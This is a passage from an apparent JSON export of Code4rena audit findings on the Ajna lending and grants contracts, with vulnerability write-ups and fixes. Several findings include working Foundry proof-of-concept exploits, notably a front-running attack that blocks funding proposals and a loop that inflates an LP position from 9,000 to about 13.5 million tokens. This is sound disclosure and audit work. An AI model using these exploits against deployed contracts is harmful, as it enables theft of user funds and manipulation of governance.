https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-core/src/PositionManager.sol#L3 ``` pragma solidity 0.8.14; ```   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Update the solidity version to 0.8.15    ## Assessed type  Other"}, {"title": "`Funding._validateCallDatas` miss the check on the length of `calldatas_[i]`", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/280", "labels": ["bug", "downgraded by judge", "grade-b", "primary issue", "QA (Quality Assurance)", "satisfactory", "sponsor confirmed", "edited-by-warden", "Q-30"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L63 https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L133   # Vulnerability details  ## Impact  When proposing a proposal, the call data would be validated in  `Funding._validateCallDatas`. It would check if the call data match the specifications. And the `calldatas_` would be used in `Funding._execute` when the proposal has passed. However, the proposal could be blocked due to the missed check on the length of `calldatas_[i]` .  ## Proof of Concept  `Funding._validateCallDatas()` checks the selector in `calldatas_[i]` and fetch the tokensRequested from `calldatas_[i]` https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L133 ```     function _validateCallDatas(         address[] memory targets_,         uint256[] memory values_,         bytes[] memory calldatas_     ) internal view returns (uint128 tokensRequested_) {          \u2026          for (uint256 i = 0; i < targets_.length;) {              \u2026             bytes memory selDataWithSig = calldatas_[i];              bytes4 selector;             //slither-disable-next-line assembly             assembly {                 selector := mload(add(selDataWithSig, 0x20))             }             if (selector != bytes4(0xa9059cbb)) revert InvalidProposal();              // https://github.com/ethereum/solidity/issues/9439             // retrieve tokensRequested from incoming calldata, accounting for selector and recipient address             uint256 tokensRequested;             bytes memory tokenDataWithSig = calldatas_[i];             //slither-disable-next-line assembly             assembly {                 tokensRequested := mload(add(tokenDataWithSig, 68))             }              // update tokens requested for additional calldata             tokensRequested_ += SafeCast.toUint128(tokensRequested);              unchecked { ++i; }         }     } ```  A normal calldata should be formed like: ``` abi.encodeWithSignature(     \"transfer(address,uint256)\",     recipient,     tokensRequested ); ```  And the `tokensRequested` can fetch by: ```             assembly {                 tokensRequested := mload(add(tokenDataWithSig, 68))             } ```  But a malformed calldata can be: ``` abi.encodeWithSignature(     \"transfer(address,uint256)\",     recipient ); ```  The calldata still pass the check in `Funding._validateCallDatas`. And the fetched `tokensRequested ` is zero   However, when the proposal has passed. The proposal cannot be executed since  `targets_[i].call` won\u2019t succeed. https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/Funding.sol#L63 ```     function _execute(         uint256 proposalId_,         address[] memory targets_,         uint256[] memory values_,         bytes[] memory calldatas_     ) internal {         // use common event name to maintain consistency with tally         emit ProposalExecuted(proposalId_);          string memory errorMessage = \"Governor: call reverted without message\";         for (uint256 i = 0; i < targets_.length; ++i) {             (bool success, bytes memory returndata) = targets_[i].call{value: values_[i]}(calldatas_[i]);             Address.verifyCallResult(success, returndata, errorMessage);         }     } ```   ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Add a length check on `calldata_[i]` to prevent invalid proposals. ```diff     function _validateCallDatas(         address[] memory targets_,         uint256[] memory values_,         bytes[] memory calldatas_     ) internal view returns (uint128 tokensRequested_) {          \u2026          for (uint256 i = 0; i < targets_.length;) {              \u2026             bytes memory selDataWithSig = calldatas_[i]; +           if (calldatas_[i].length != 68) revert InvalidProposal();               bytes4 selector;             //slither-disable-next-line assembly             assembly {                 selector := mload(add(selDataWithSig, 0x20))             }             if (selector != bytes4(0xa9059cbb)) revert InvalidProposal();              \u2026         }     } ```       ## Assessed type  Invalid Validation"}, {"title": "Adversary can prevent the creation of any extraordinary funding proposal by frontrunning `proposeExtraordinary()`", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/260", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-09"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L85-L92 https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L94 https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L139-L141   # Vulnerability details  ## Impact  A griefing attack can be conducted to prevent the creation of any extraordinary funding proposal, or targetting specific receivers.  The cost of performing the attack is low, only involving the gas payment for the transaction.  ## Proof of Concept  `ExtraordinaryFunding::proposeExtraordinary()` hashes all its inputs except for `endBlock_` when creating the `proposalId`:  ```solidity     function proposeExtraordinary(         uint256 endBlock_,         address[] memory targets_,         uint256[] memory values_,         bytes[] memory calldatas_,         string memory description_) external override returns (uint256 proposalId_) {          proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_))))); ```  [Link to code](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L85-L92)  This allows an adversary to frontrun the transaction, and create an exact proposal, but with an `endBlock` that will the proposal expire instantly, in a past block or whenever they want.  ```solidity         ExtraordinaryFundingProposal storage newProposal = _extraordinaryFundingProposals[proposalId_];         // ...         newProposal.endBlock        = SafeCast.toUint128(endBlock_); ```  [Link to code](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L94)  Nobody will be able to vote via `ExtraordinaryFunding::voteExtraordinary`, as the transaction will revert because of `proposal.endBlock < block.number`:  ```solidity         if (proposal.startBlock > block.number || proposal.endBlock < block.number || proposal.executed) {             revert ExtraordinaryFundingProposalInactive();         } ```  [Link to code](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L139-L141)  With no votes, the proposal can't be executed.  ## Coded Proof of Concept  This test demonstrates how an adversary can frontrun the creation of an extraordinary proposal with a value of `endBlock` that will the proposal \"end\" instantly, while preventing the intended proposal to be created.  Add this test to `ajna-grants/test/unit/ExtraordinaryFunding.t.sol` and run `forge test -m \"testProposeExtraordinary_Frontrun\"`:  ```solidity     function testProposeExtraordinary_Frontrun() external {         // The user that will try to propose the funding         changePrank(_tokenHolder1);          // 14 tokenholders self delegate their tokens to enable voting on the proposals         _selfDelegateVoters(_token, _votersArr);          vm.roll(_startBlock + 100);          // set proposal params         uint256 endBlockParam = block.number + 100_000;         uint256 tokensRequestedParam = 50_000_000 * 1e18;          // generate proposal targets         address[] memory targets = new address[](1);         targets[0] = address(_token);          // generate proposal values         uint256[] memory values = new uint256[](1);         values[0] = 0;          // generate proposal calldata         bytes[] memory calldatas = new bytes[](1);         calldatas[0] = abi.encodeWithSignature(             \"transfer(address,uint256)\",             _tokenHolder1,             tokensRequestedParam         );          /***********************************          *          ATTACK BEGINS          *          ***********************************/          // An attacker sees the proposal in the mempool and frontruns it.         // By setting an `endBlock_ == 0`, it will create a \"defeated\" proposal.         // So when the actual user tries to send the real proposal, that one will revert.         address attacker = makeAddr(\"attacker\");         changePrank(attacker);         uint256 pastEndBlockParam = 0; // @audit          uint256 proposalId = _grantFund.proposeExtraordinary(             pastEndBlockParam, targets, values, calldatas, \"Extraordinary Proposal for Ajna token transfer to tester address\"         );          // Verify that the proposal is created and has a `Defeated` state         IFunding.ProposalState proposalState = _grantFund.state(proposalId);         assertEq(uint8(proposalState), uint8(IFunding.ProposalState.Defeated));          /***********************************          *           ATTACK ENDS           *          ***********************************/          // When the user tries to send the proposal it will always revert.         // As a previous proposal with the same hash has been already sent, despite that having a malicious `endBlockParam`.         changePrank(_tokenHolder1);         vm.expectRevert(IFunding.ProposalAlreadyExists.selector);         _grantFund.proposeExtraordinary(             endBlockParam, targets, values, calldatas, \"Extraordinary Proposal for Ajna token transfer to tester address\"         );     } ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Add `endBlock_` to the hash of the proposal. This way there will be no impact in frontrunning the transaction, as the expected proposal will be stored.  ```diff     function proposeExtraordinary(         uint256 endBlock_,         address[] memory targets_,         uint256[] memory values_,         bytes[] memory calldatas_,         string memory description_) external override returns (uint256 proposalId_) {  -       proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_))))); +       proposalId_ = _hashProposal(endBlock_, targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_))))); ```  ```diff     function executeExtraordinary( +       uint256 endBlock_,         address[] memory targets_,         uint256[] memory values_,         bytes[] memory calldatas_,         bytes32 descriptionHash_     ) external nonReentrant override returns (uint256 proposalId_) { -       proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_))); +       proposalId_ = _hashProposal(endBlock_, targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_))); ```   ## Assessed type  Other"}, {"title": "User can exponentially increase the value of their position through the memorializePositions function", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/256", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-07"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170-L210   # Vulnerability details  ## Impact The [PositionManager contract](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L42) allows a lender to mint an NFT that will be representative of their lp positions. This is done by [minting](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L227) an NFT and then invoking the [memorializePositions function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170) which will assign their lp positions to the respective NFT. However, while the memorializePositions function will update the lp balances based on the [entirety](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L188) of the lender's lp balance for a given index bucket within the pool, the [Pool contract](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/Pool.sol#L74) will update the lender's balance based on the [minimum value](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LPActions.sol#LL244C70-L244C70) between the allowed amount and the lender's balance. This means that, if a user specifies an allowance for the PositionManager contract by calling the [increaseLPAllowance function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/Pool.sol#L455) that is less than their total balance for a respective position before invoking the memorializePositions function, their position's lp balance tracked by the [PositionManager's state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L202) will increase by the entirety of their balance while their position that is tracked by the [Pool's state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LPActions.sol#L260) will only decrease by the specified allowance. The impact of this is that a lender can exponentially increase the value of their position by repeating the steps of specifying a minimum allowance for the PositionManager for their positions and then invoking memorializePositions until their lp position that is tracked by the Pool's state is 0. The lender can then [stake](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L207) this exponentially overvalued position through the [RewardsManager contract](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L35) allowing them to receive substantially more rewards for their position then should be allotted. The direct implications of this are that the user will be rewarded a substantial amount of AJNA reward tokens which are directly redeemable for the Pool's quote tokens through its Redeemable Reserve and, additionally, over-value the user's influence on the protocol's proposal funding because a user's votes are weighted by the amount of AJNA tokens they hold. We believe this to be a high severity vulnerability because it directly affects user funds and the functionality of the protocol in general.     ## Proof of Concept The described vulnerability occurs when a lender specifies allowances for the PositionManager contract that are less than their lp balance for each respective index through the [increaseLPAllowance function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/base/Pool.sol#L455) and then invokes the [memorializePositions function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170). The result of this is that the user's lp balance tracked by the [PositionManager's state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L202) will increment by the position's balance while the lp balance tracked by the [Pool's state](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/external/LPActions.sol#L260) will only decrement by the specified allowance. A user can repeat this process through multiple iterations until their respective lp balances with the Pool contract are 0 which will exponentially increase the value of their position.    Please see the following test case for a POC simulating the effect of this described vulnerability on a user's position: ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.14;  import \"forge-std/console.sol\";  import {Base64} from \"@base64-sol/base64.sol\";  import \"tests/forge/unit/PositionManager.t.sol\";  /**  *  @title  Proof of Concept  *  @notice Simulates the effect of the described vulnerability where a user  *          can exponentially increase the value of their position by:  *          1- only approving the `PositionManager` for a min amount of their position  *          2- invoking 'memorializePositions' on their position's respective NFT  *          3- repeating these steps until their respective position's Pool lp balance is 0  *  @dev    This test case can be implemented and run from the ajna-core/tests/forge directory  */ contract POC is PositionManagerERC20PoolHelperContract {     function testMemorializePositionsWithMinApproval() external {         uint256 intialLPBalance;         uint256 finalLPBalance;          address testsAddress = makeAddr(\"testsAddress\");         uint256 mintAmount = 10000 * 1e18;          _mintQuoteAndApproveManagerTokens(testsAddress, mintAmount);          // Call pool contract directly to add quote tokens         uint256[] memory indexes = new uint256[](3);         indexes[0] = 2550;         indexes[1] = 2551;         indexes[2] = 2552;          _addInitialLiquidity({             from: testsAddress,             amount: 3_000 * 1e18,             index: indexes[0]         });         _addInitialLiquidity({             from: testsAddress,             amount: 3_000 * 1e18,             index: indexes[1]         });         _addInitialLiquidity({             from: testsAddress,             amount: 3_000 * 1e18,             index: indexes[2]         });          // Mint an NFT to later memorialize existing positions into.         uint256 tokenId = _mintNFT(testsAddress, testsAddress, address(_pool));          // Pool lp balances before.         (uint256 poolLPBalanceIndex1, ) = _pool.lenderInfo(             indexes[0],             testsAddress         );         (uint256 poolLPBalanceIndex2, ) = _pool.lenderInfo(             indexes[1],             testsAddress         );         (uint256 poolLPBalanceIndex3, ) = _pool.lenderInfo(             indexes[2],             testsAddress         );          console.log(\"\\n Pool lp balances before:\");         console.log(\"bucket %s: %s\", indexes[0], poolLPBalanceIndex1);         console.log(\"bucket %s: %s\", indexes[1], poolLPBalanceIndex2);         console.log(\"bucket %s: %s\", indexes[2], poolLPBalanceIndex3);          intialLPBalance =             poolLPBalanceIndex1 +             poolLPBalanceIndex2 +             poolLPBalanceIndex3;          // PositionManager lp balances before.         (uint256 managerLPBalanceIndex1, ) = _positionManager.getPositionInfo(             tokenId,             indexes[0]         );         (uint256 managerLPBalanceIndex2, ) = _positionManager.getPositionInfo(             tokenId,             indexes[1]         );         (uint256 managerLPBalanceIndex3, ) = _positionManager.getPositionInfo(             tokenId,             indexes[2]         );          console.log(\"\\n PositionManger lp balances before:\");         console.log(\"bucket %s: %s\", indexes[0], managerLPBalanceIndex1);         console.log(\"bucket %s: %s\", indexes[1], managerLPBalanceIndex1);         console.log(\"bucket %s: %s\", indexes[2], managerLPBalanceIndex1);          console.log(             \"\\n <--- Repeatedly invoke memorializePositions with a min allowance set for each tx --->\"         );          // Approve the PositionManager for only 1 token in each bucket.         uint256[] memory amounts = new uint256[](3);         amounts[0] = 1 * 1e18;         amounts[1] = 1 * 1e18;         amounts[2] = 1 * 1e18;          // Continuosly invoke memorializePositions with the min allowance         // until Pool lp balance is 0.         while (             poolLPBalanceIndex1 != 0 &&             poolLPBalanceIndex2 != 0 &&             poolLPBalanceIndex3 != 0         ) {             // Increase manager allowance.             _pool.increaseLPAllowance(                 address(_positionManager),                 indexes,                 amounts             );              // Memorialize quote tokens into minted NFT.             IPositionManagerOwnerActions.MemorializePositionsParams                 memory memorializeParams = IPositionManagerOwnerActions                     .MemorializePositionsParams(tokenId, indexes);             _positionManager.memorializePositions(memorializeParams);              // Get new Pool lp balances.             (poolLPBalanceIndex1, ) = _pool.lenderInfo(                 indexes[0],                 testsAddress             );             (poolLPBalanceIndex2, ) = _pool.lenderInfo(                 indexes[1],                 testsAddress             );             (poolLPBalanceIndex3, ) = _pool.lenderInfo(                 indexes[2],                 testsAddress             );         }          // Pool lp balances after.         console.log(\"\\n Pool lp balances after:\");         console.log(\"bucket %s: %s\", indexes[0], poolLPBalanceIndex1);         console.log(\"bucket %s: %s\", indexes[1], poolLPBalanceIndex2);         console.log(\"bucket %s: %s\", indexes[2], poolLPBalanceIndex3);          // PositionManager lp balances after.         (managerLPBalanceIndex1, ) = _positionManager.getPositionInfo(             tokenId,             indexes[0]         );         (managerLPBalanceIndex2, ) = _positionManager.getPositionInfo(             tokenId,             indexes[1]         );         (managerLPBalanceIndex3, ) = _positionManager.getPositionInfo(             tokenId,             indexes[2]         );          console.log(\"\\n PositionManger lp balances after:\");         console.log(\"bucket %s: %s\", indexes[0], managerLPBalanceIndex1);         console.log(\"bucket %s: %s\", indexes[1], managerLPBalanceIndex1);         console.log(\"bucket %s: %s \\n\", indexes[2], managerLPBalanceIndex1);          finalLPBalance =             managerLPBalanceIndex1 +             managerLPBalanceIndex2 +             managerLPBalanceIndex3;          // Assert that the initial and ending balances are equal.         assertEq(intialLPBalance, finalLPBalance);     } }  ``` For reference the log outputs that display the overall change in the users position are the following: ```  Pool lp balances before:   bucket 2550: 3000000000000000000000   bucket 2551: 3000000000000000000000   bucket 2552: 3000000000000000000000     PositionManger lp balances before:   bucket 2550: 0   bucket 2551: 0   bucket 2552: 0     <--- Repeatedly invoke memorializePositions with a min allowance set for each tx --->     Pool lp balances after:   bucket 2550: 0   bucket 2551: 0   bucket 2552: 0     PositionManger lp balances after:   bucket 2550: 4501500000000000000000000   bucket 2551: 4501500000000000000000000   bucket 2552: 4501500000000000000000000     Error: a == b not satisfied [uint]     Expected: 13504500000000000000000000       Actual: 9000000000000000000000 ``` The test case simulates a user that has created a position by providing 9,000 tokens as liquidity into a pool depositing 3,000 tokens, each, into price buckets 2550, 2551, and 2552. An NFT is then minted for the user. The test case then iteratively approves the PositionManager contract for an allowance of 1 token for each price bucket and invokes the memorializePositions function, repeating these steps until the Pool lp balance for their positions are 0. As can be seen by the log output, the value of the position per price bucket dramatically increases with the position in each bucket being valued at 4,501,500 tokens by the end of the test. In total, the user's position has increased in value from 9,000 tokens to 13,504,500 tokens.   ## Tools Used Foundry  ## Recommended Mitigation Steps It is recommended to implement a check within the [memorializePositions function](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L170) that will ensure that a user has specified an allowance at least equal to their lp balance at each respective index, reverting with a custom error if not true. For example, the function could be refactored to the following where the mentioned check is implemented [here](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/PositionManager.sol#L189): ```solidity     function memorializePositions(         MemorializePositionsParams calldata params_     ) external override {         EnumerableSet.UintSet storage positionIndex = positionIndexes[params_.tokenId];          IPool   pool  = IPool(poolKey[params_.tokenId]);         address owner = ownerOf(params_.tokenId);          uint256 indexesLength = params_.indexes.length;         uint256 index;          for (uint256 i = 0; i < indexesLength; ) {             index = params_.indexes[i];              // record bucket index at which a position has added liquidity             // slither-disable-next-line unused-return             positionIndex.add(index);              (uint256 lpBalance, uint256 depositTime) = pool.lenderInfo(index, owner);              // check that specified allowance is at least equal to the lp balance             uint256 allowance = pool.lpAllowance(index, address(this), owner);              if(allowance < lpBalance) revert AllowanceTooLow();              Position memory position = positions[params_.tokenId][index];              // check for previous deposits             if (position.depositTime != 0) {                 // check that bucket didn't go bankrupt after prior memorialization                 if (_bucketBankruptAfterDeposit(pool, index, position.depositTime)) {                     // if bucket did go bankrupt, zero out the LP tracked by position manager                     position.lps = 0;                 }             }              // update token position LP             position.lps += lpBalance;             // set token's position deposit time to the original lender's deposit time             position.depositTime = depositTime;              // save position in storage             positions[params_.tokenId][index] = position;              unchecked { ++i; }         }          // update pool LP accounting and transfer ownership of LP to PositionManager contract         pool.transferLP(owner, address(this), params_.indexes);          emit MemorializePosition(owner, params_.tokenId, params_.indexes);     } ```   ## Assessed type  Other"}, {"title": "Missing emergency withdraw functionality in RewardsManager.sol", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/231", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-37"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L280 https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L270   # Vulnerability details  Missing emergency withdraw functionality in `RewardsManager.sol`  ## Impact No audit/bug bounty program can guarantee that everything works correctly 100% of the time. The `RewardsManager` contract has a large number of calculations and theoretical failure points. However, the contract only has one way to unstake an NFT, which is through the `RewardsManager.unstake()` method, which still calls [`_claimRewards()`](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L280) before unstaking, which has complex logic and does not provide the user with a **guaranteed unstaking in case** something goes wrong.  ## Proof of Concept Let's consider why such functionality should be in `RewardsManager`:  1. `RewardsManager.sol` is not an upgradable contract. 2. The reward calculation mechanism has complex logic. 3. There are many potential failure points that can occur during unstaking     1. Validations     2. Overflow/underflow     3. Calls to other contracts (such as [AJNA transfer](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L819), [currentBurnEpoch](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L283), [getPositionIndexes](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L227), [getPositionIndexesFiltered](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L334), [burnInfo](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L645), [bucketExchangeRate](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L752),...)     4. A large number of mathematical operations in both RewardsManager and Pool ([Buckets.sol#L144](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/internal/Buckets.sol#L144), [PoolHelper.sol#L44](https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/libraries/helpers/PoolHelper.sol#L44)...)  This means that if an error occurs somewhere, it could block the withdrawal process, so it is **standard practice to have a fallback option for such situations**, where the user forfeits their reward but can still guarantee the withdrawal of their NFT.  ## Tools Used * Manual review * Foundry  ## Recommended Mitigation Steps * Add an unstake/emergencyWithdraw method, ignoring the calculation of rewards according to the principle of emergency withdraw()   ## Assessed type  Other"}, {"title": "Unsafe casting from `uint256` to `uint128` in RewardsManager", "html_url": "https://github.com/code-423n4/2023-05-ajna-findings/issues/227", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-10"], "target": "2023-05-ajna-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L179 https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L180 https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L236 https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L241   # Vulnerability details  ## Impact Unsafe casting from `uint256` to `uint128` in RewardsManager, instances: ```diff File: 2023-05-ajna\\ajna-core\\src\\RewardsManager.sol  178:             BucketState storage toBucket = stakeInfo.snapshot[toIndex]; +179:             toBucket.lpsAtStakeTime  = uint128(positionManager.getLP(tokenId_, toIndex)); +180:             toBucket.rateAtStakeTime = uint128(IPool(ajnaPool).bucketExchangeRate(toIndex)); 181:   235:             // record the number of lps in bucket at the time of staking +236:             bucketState.lpsAtStakeTime = uint128(positionManager.getLP( 237:                 tokenId_, 238:                 bucketId 239:             )); 240:             // record the bucket exchange rate at the time of staking +241:             bucketState.rateAtStakeTime = uint128(IPool(ajnaPool).bucketExchangeRate(bucketId)); ``` can cause an overflow which, in turn, can lead to unforeseen consequences such as: *  The inability to calculate new rewards, as `nextExchangeRate > exchangeRate_` will always be true after the overflow. * Reduced rewards because `toBucket.lpsAtStakeTime` will be reduced. * Reduced rewards because `toBucket.rateAtStakeTime` will be reduced. * In case `bucketState.rateAtStakeTime` overflows first but does not go beyond the limits in the new epoch, it will result in increased rewards being accrued.  ## Proof of Concept In `RewardsManager.stake()` and `RewardsManager.moveStakedLiquidity()`, the functions downcast `uint256` to `uint128` without checking whether it is bigger than `uint128` or not.  In `stake()` & `moveStakedLiquidity()` when `getLP >= type(uint128).max`: ```javascript File: 2023-05-ajna\\ajna-core\\src\\RewardsManager.sol  236:             bucketState.lpsAtStakeTime = uint128(positionManager.getLP( 237:                 tokenId_, 238:                 bucketId 239:             ));  ``` Let's assume, that the staker had LP in the bucket equal `type(uint128).max`, and his stake balance LP was recorded as 0. As a result, the reward for the epoch at the moment of the stake will be accrued as  ```javascript File: 2023-05-ajna\\ajna-core\\src\\RewardsManager.sol  504:                 interestEarned_ = Maths.wmul(nextExchangeRate - exchangeRate_, bucketLP_);  2023-05-ajna\\ajna-core\\src\\libraries\\internal\\Maths.sol 11:     uint256 internal constant WAD = 1e18; 12:  13:     function wmul(uint256 x, uint256 y) internal pure returns (uint256) { 14:         return (x * y + WAD / 2) / WAD; 15:     } ``` And will be equal to (0 + 0.5e18)/1e18=0, resulting in the user losing the reward.  In `stake() & moveStakedLiquidity()` when `bucketExchangeRate >= type(uint128).max`: If an overflow occurs and `bucketExchangeRate` is reset to zero: ```javascript File: 2023-05-ajna\\ajna-core\\src\\RewardsManager.sol  180:             toBucket.rateAtStakeTime = uint128(IPool(ajnaPool).bucketExchangeRate(toIndex));  241:             bucketState.rateAtStakeTime = uint128(IPool(ajnaPool).bucketExchangeRate(bucketId));  ``` Results in the reward being skipped for one 1 epoch, because:  ```javascript  File: ajna-core\\src\\RewardsManager.sol  497:             uint256 nextExchangeRate = bucketExchangeRates[pool_][bucketIndex_][nextEventEpoch_]; 498:  499:             // calculate interest earned only if next exchange rate is higher than current exchange rate 500:             if (nextExchangeRate > exchangeRate_) { 501:  502:                 // calculate the equivalent amount of quote tokens given the stakes lp balance, 503:                 // and the exchange rate at the next and current burn events 504:                 interestEarned_ = Maths.wmul(nextExchangeRate - exchangeRate_, bucketLP_); 505:             } ``` The current rate will be equal to 0 or greater than 0, but less than the previous rate.  Also, if the next epoch has a rate less than `type(uint128).max`, this will result in ```interestEarned_ = Maths.wmul(nextExchangeRate - exchangeRate_, bucketLP_);```, where `nextExchangeRate - exchangeRate_` will be in the range of `2^128 - 1 - {0, N^18}`. This can lead to an overflow error when `bucketLP_` is large `(1e45)`, because `(2^128-1) * 1e38`, which in turn can cause the transaction to fail. ```c File: ajna-core\\src\\libraries\\internal\\Maths.sol  13:     function wmul(uint256 x, uint256 y) internal pure returns (uint256) { 14:         return (x * y + WAD / 2) / WAD; 15:     } ``` Yes, in the case of LP, the number of tokens approaching `2^128` is highly unlikely and does not pose a direct threat to the user, except for not receiving the reward. But as for the bucketExchangeRate, since it is calculated according to different formulas, it cannot be ruled out that such a case is more likely    **Tests for LP, which simply shows that overflow occurs:** ```diff  diff --git a/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol b/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol index 4100e9f..58c3d8c 100644 --- a/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol +++ b/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol @@ -8,7 +8,7 @@ import 'src/interfaces/rewards/IRewardsManager.sol';   import { ERC20Pool }           from 'src/ERC20Pool.sol';  import { RewardsHelperContract }   from './RewardsDSTestPlus.sol'; - +import '@std/console2.sol';  contract RewardsManagerTest is RewardsHelperContract {       address internal _borrower; @@ -127,6 +127,33 @@ contract RewardsManagerTest is RewardsHelperContract {          });      }  +    function test_Issue() external { +        // configure NFT position one +        uint256[] memory depositIndexes = new uint256[](1); +        